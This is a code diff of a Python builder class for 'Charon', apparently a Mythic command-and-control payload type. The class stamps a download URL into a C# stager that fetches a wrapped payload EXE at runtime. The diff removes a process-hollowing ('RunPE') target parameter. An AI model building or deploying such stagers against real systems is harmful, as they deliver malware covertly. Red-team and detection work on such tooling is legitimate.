@@ -26,12 +26,6 @@ class CharonAgent(PayloadType):
             description="URL where the wrapped payload EXE is hosted (stager downloads from here at runtime)",
             required=True,
         ),
-        BuildParameter(
-            name="spawn_process",
-            parameter_type=BuildParameterType.String,
-            description="Sacrificial process for RunPE process hollowing",
-            default_value=r"C:\Windows\System32\notepad.exe",
-        ),
     ]
     agent_path = pathlib.Path(".") / "Charon"
     agent_icon_path = None
@@ -46,18 +40,16 @@ class CharonAgent(PayloadType):
         resp = BuildResponse(status=BuildStatus.Success)
 
         download_url = self.get_parameter("download_url")
-        spawn_process = self.get_parameter("spawn_process")
 
         # --- Read and stamp C# stager template ---
         stager_template_path = self.agent_code_path / "Stager.cs"
         stager_code = stager_template_path.read_text()
         stager_code = stager_code.replace("%DOWNLOAD_URL%", download_url)
-        stager_code = stager_code.replace("%SPAWN_PROCESS%", spawn_process)
 
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName="Configuring Stager",
-            StepStdout=f"Download URL: {download_url}\nSpawn Process: {spawn_process}",
+            StepStdout=f"Download URL: {download_url}",
             StepSuccess=True,
         ))
 
